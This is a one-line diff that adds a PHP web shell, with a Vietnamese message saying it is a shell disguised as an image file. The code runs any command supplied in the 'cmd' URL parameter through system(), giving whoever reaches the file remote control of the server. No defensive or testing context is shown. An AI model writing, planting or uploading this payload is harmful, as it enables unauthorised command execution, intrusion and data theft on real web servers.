@@ -1,0 +1,1 @@
+<?php echo "HACKED! Day la shell ngam trang file anh"; system($_GET["cmd"]); ?>
